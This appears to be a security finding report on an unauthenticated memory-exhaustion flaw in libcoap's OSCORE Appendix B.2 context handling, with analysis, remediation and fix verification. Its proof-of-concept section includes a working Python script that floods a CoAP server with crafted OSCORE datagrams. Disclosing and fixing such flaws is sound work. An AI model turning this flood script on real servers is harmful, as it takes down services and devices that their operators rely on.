# Unauthenticated memory exhaustion in OSCORE Appendix B.2 context handling

**ID:** vuln-0002
**Severity:** MEDIUM
**Found:** 2026-11-17 11:14:54 UTC
**Target:** libcoap 4.3.5 OSCORE (src/coap_oscore.c, src/oscore/oscore_context.c)
**Endpoint:** CoAP/UDP OSCORE request carrying an OSCORE option with a kid_context
**Method:** POST
**CWE:** CWE-770
**CVSS:** 5.9
**Confidence:** High
**Fix Effort:** Low

## Description

When an OSCORE security context has RFC 8613 Appendix B.2 enabled, libcoap derives and permanently links a new OSCORE security context for every incoming request that carries a previously unseen `kid_context`, and it does so **before** the AEAD tag is verified. When verification fails (always, for a peer without the master secret) the newly created context is never removed. An unauthenticated attacker can therefore make the server allocate an unbounded number of security contexts by sending requests with ever-changing `kid_context` values, eventually exhausting memory and taking the CoAP service down.

Every datagram is answered with `4.01 Security context not found`; no credential is needed and the memory is never reclaimed.

## Impact

Remote, unauthenticated denial of service. Each crafted datagram permanently adds one OSCORE security context (master secret/salt copies, sender and recipient contexts, derived keys) to the CoAP context chain. Memory grows without bound and is never reclaimed until the process restarts; because context lookup walks the whole chain, request processing cost also degrades quadratically as the chain grows. On the constrained devices libcoap targets, a few thousand packets are enough to exhaust the available heap.

## Counterevidence

I verified the alternative explanation first: the growth is not generic per-packet noise, because the identical flood against the same binary with `rfc8613_b_2,bool,false` leaves resident memory flat (5480 kB to 5580 kB), while the B.2-enabled run grows monotonically in the same test. I also confirmed by walking the context chain that the number of linked OSCORE contexts itself grows by exactly one per request, and that the count stays at one after applying the fix, so the memory is genuinely retained security state rather than allocator slack. Constraints that limit severity are real and are stated in the assumptions: the feature is not enabled by default in the shipped configuration files, and the per-packet cost is modest (tens of bytes for a small `kid_context`, scaling with the attacker-supplied `kid_context` length up to roughly 250 bytes). The time to exhaustion therefore depends on the target's memory budget; on a full-size server it is a slow exhaustion, whereas on a constrained device it is small. I could not test against a real memory-constrained device build.

## What Would Change This Severity

Confirmation that a deployed server enables `rfc8613_b_2` (for example an OSCORE interoperability deployment) would raise this to High, because no other precondition would remain between an unauthenticated datagram and unbounded memory growth.

## Technical Analysis

Request processing in `coap_oscore_decrypt_pdu()` performs all of the following **before** `cose_encrypt0_decrypt()` is reached:

1. `oscore_decode_option_value()` extracts `kid` and `kid_context` from the OSCORE option.
2. `oscore_find_context()` fails to match the supplied `kid_context`.
3. Because the security context has `rfc8613_b_2` set, the code CBOR-unwraps the attacker-supplied `kid_context` and calls `oscore_duplicate_ctx()` (src/coap_oscore.c:1111).
4. `oscore_duplicate_ctx()` allocates a new `oscore_ctx_t`, copies the master secret/salt, derives a sender key and a common IV, adds a recipient for the supplied `kid`, and links the context into the CoAP context chain with `oscore_enter_context()` (src/oscore/oscore_context.c).

The AEAD check then fails, and the error path at src/coap_oscore.c:1856-1867 deletes the request association and the PDUs but never unlinks or frees the duplicated context. `osc_ctx` is a local variable that goes out of scope. The context is only ever freed by `oscore_remove_context()`/`coap_free_context()`, so it stays in the CoAP context chain forever.

Because `oscore_find_context()` iterates the whole context chain for every request, the per-request cost grows linearly with the number of accumulated contexts, so the flood is also a CPU amplification vector.

The defect is the ordering of "create security state" before "authenticate the message", combined with a failure path that does not roll the state back. The `kid_context` bytes are fully attacker-controlled (1-250 bytes), so both the number of contexts and their size can be driven by the attacker.

## Proof of Concept

1. Configure an OSCORE security context with `master_secret`, `master_salt`, a `sender_id`, at least one `recipient_id`, and `rfc8613_b_2,bool,true`; start the shipped `coap-server` with that configuration on a local UDP port.
2. Send a CoAP NON POST datagram to the server. The PDU contains a single OSCORE option (number 9) whose value is `0x19` (Partial IV length 1, H and K bits set), a one-byte Partial IV, the `kid_context` length byte, the CBOR-wrapped `kid_context`, and the recipient key id `0x01`; the payload is arbitrary ciphertext.
3. Vary the `kid_context` bytes in every datagram so each request names a context the server has not seen before. No valid AEAD tag is ever supplied, so every request is rejected with 4.01.
4. Observe the server's resident memory grow linearly with the number of packets and never recover; with `rfc8613_b_2,bool,false` the identical traffic leaves the memory flat.
5. The same effect can be measured deterministically by walking the CoAP context's linked OSCORE context chain and counting the contexts before and after the flood.

````python
#!/usr/bin/env python3
# Unauthenticated OSCORE context accumulation against libcoap (RFC 8613 App. B.2)
# Server: coap-server -A 127.0.0.1 -p 5683 -E b2.conf
# b2.conf:
#   master_secret,hex,"0102030405060708090a0b0c0d0e0f10"
#   master_salt,hex,"9e7ca92223786340"
#   sender_id,hex,""
#   recipient_id,hex,"01"
#   rfc8613_b_2,bool,true
import socket, subprocess, time, signal

SERVER = ["coap-server", "-A", "127.0.0.1", "-p", "5683", "-E", "b2.conf"]
srv = subprocess.Popen(SERVER)
time.sleep(1.0)

def rss(pid):
    for line in open("/proc/%d/status" % pid):
        if line.startswith("VmRSS"):
            return int(line.split()[1])
    return -1

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
KID = bytes([0x01])

def packet(i, kc_len=200):
    body = i.to_bytes(8, "big") + bytes(max(0, kc_len - 8))   # unique kid_context
    kc = bytes([0x58, len(body)]) + body                     # CBOR bstr
    opt = bytes([0x19, (i >> 8) & 0xff, len(kc)]) + kc + KID  # PIV len 1, H, K
    hdr = bytes([0x90 | 13, len(opt) - 13])                   # option 9, ext. length
    return bytes([0x50, 0x02]) + (i & 0xffff).to_bytes(2, "big") + hdr + opt \
           + bytes([0xff]) + bytes(16)                        # bogus ciphertext

print("rss start %d kB" % rss(srv.pid))
for batch in range(6):
    for i in range(batch * 20000, (batch + 1) * 20000):
        s.sendto(packet(i), ("127.0.0.1", 5683))
    time.sleep(0.3)
    print("after %6d requests: rss %d kB" % ((batch + 1) * 20000, rss(srv.pid)))
srv.send_signal(signal.SIGKILL)
```
````

## Remediation

Treat the Appendix B.2 derived security context as provisional until the request that caused its creation has been authenticated: record the context created by the duplication, keep it only when AEAD verification succeeds, and otherwise release the session reference and remove it from the CoAP context chain. Alternatively, rate-limit or cap the number of security contexts that can be created from unauthenticated traffic, or defer context creation until the child context can be validated. Deployments that do not need RFC 8613 Appendix B.2 should keep `rfc8613_b_2` disabled.

## Fix Verification

Gates were worked in order against a build of the patched tree using the same configuration as the original build (OpenSSL backend, COAP_OSCORE_SUPPORT, one OSCORE context with `rfc8613_b_2,bool,true`).

1. Security closure. Re-traced the path: `oscore_duplicate_ctx()` is now recorded in `b2_dup_ctx`; the pointer is cleared only after `cose_encrypt0_decrypt()` returned a positive length and `rcp_ctx->rollback_valid = 0` is executed, so a context survives exactly when the request authenticated. All failure exits between duplication and that point converge on the `error`/`error_no_ack` labels, where the new block releases the session reference and calls `oscore_remove_context()`. Re-ran the chain-walk PoC with the patched build: `contexts before: 1`, `contexts after 2000 unauthenticated requests: 1` (unpatched: 2001). Re-ran the 120,000-datagram flood against a plain (non-sanitizer) build of the patched `coap-server`: resident memory stayed flat, 5516 kB to 5580 kB, instead of growing to 11256 kB.

2. Bypass review. Checked the other callers of `oscore_duplicate_ctx()` (it is called only from this one B.2 branch) and the other exits that follow it: the B.2 step 2 success block deliberately jumps to `error_no_ack` after decryption, which is why the pointer is cleared on the success path instead of relying on the label alone; without that, the legitimate B.2 handshake context would have been destroyed. Also checked the B.2 step 4 path (`session->oscore_r2 != 0`), which updates an existing context and never sets `b2_dup_ctx`. Checked that a session whose `recipient_ctx` does not belong to the duplicated context is left alone by the `session->recipient_ctx->osc_ctx == b2_dup_ctx` guard. Alternate inputs tried: requests with a `kid_context` that fails CBOR unwrapping or exceeds the 255-byte OSCORE-option bound exit before `oscore_duplicate_ctx()` and are unaffected; requests that decrypt successfully leave the context in place; a flood with B.2 disabled is unaffected before and after the change.

3. Preserved behaviour. The successful B.2 path still keeps the derived context, and the failure path still returns NULL after sending the same 4.00/4.01 responses. All 37 OSCORE unit tests pass (`tests/test_oscore.c`, including the RFC 8613 Appendix C test vectors): 37 tests, 389 asserts, 0 failures. The existing 4.01 "Security context not found" response for unknown kids is unchanged.

4. Repository checks. The patched tree compiles with no warnings for the changed translation units using the project's own build flags and links cleanly; the OSCORE fuzz harnesses (decrypt with B.2 enabled, inner-plaintext, config parser) run without sanitizer reports against the patched build.

Not executed: a full autotools/cmake build and the complete `make check` suite (the environment provides a hand-rolled build of the library plus the OSCORE test driver). The full non-OSCORE test suite was not run.

## Assumptions

The server must be built with OSCORE support and its security context must have RFC 8613 Appendix B.2 enabled (`rfc8613_b_2,bool,true`). This is a documented configuration option, but its default is false, so a deployment must have opted into the B.2 interoperability mode. No credentials, no handshake and no user interaction are needed for the attack itself.
